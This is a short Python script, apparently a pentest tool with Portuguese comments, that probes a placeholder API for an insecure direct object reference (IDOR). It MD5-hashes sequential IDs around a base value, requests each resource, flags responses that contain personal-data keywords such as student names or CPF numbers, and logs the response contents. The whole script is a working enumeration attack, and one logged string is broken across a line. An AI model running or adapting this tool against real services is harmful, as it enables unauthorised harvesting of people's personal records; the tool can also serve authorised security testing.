import requests
import time
import hashlib

# === CONFIGURAÇÕES ===
base_id = 1000
base_url = "https://exemplo.com/api/resource?id="  # Altere conforme necessário
log_file = "hash_idor_log.txt"
range_min = -10
range_max = 10
keywords_sucesso = ["nome", "aluno", "sucesso", "dados", "informação", "cpf"]

def gerar_hash(valor, tipo="md5"):
    valor = str(valor).encode()
    if tipo == "md5":
        return hashlib.md5(valor).hexdigest()
    elif tipo == "sha1":
        return hashlib.sha1(valor).hexdigest()
    elif tipo == "sha256":
        return hashlib.sha256(valor).hexdigest()
    return valor

with open(log_file, "w", encoding="utf-8") as log:
    for i in range(range_min, range_max + 1):
        current_id = base_id + i
        hashed_id = gerar_hash(current_id, tipo="md5")
        url = f"{base_url}{hashed_id}"
        try:
            response = requests.get(url, timeout=10)
            conteudo = response.text.lower()
            sucesso = any(k in conteudo for k in keywords_sucesso)

            print(f"[{response.status_code}] Testando ID hash {hashed_id} (original {current_id})")
            if sucesso:
                print(f"✅ POSSÍVEL SUCESSO DETECTADO - ID hash {hashed_id}")
            print("-" * 100)

            log.write(f"[{response.status_code}] ID hash {hashed_id} (original {current_id})\n")
            log.write(f"URL: {url}\n")
            if sucesso:
                log.write(">>> POSSÍVEL SUCESSO DETECTADO <<<\n")
            log.write(f"Resposta:
{conteudo[:1000]}\n")
            log.write("-" * 100 + "\n")

            time.sleep(0.5)
        except Exception as e:
            print(f"Erro no ID {hashed_id}: {e}")
            log.write(f"Erro no ID {hashed_id}: {e}\n")
            log.write("-" * 100 + "\n")
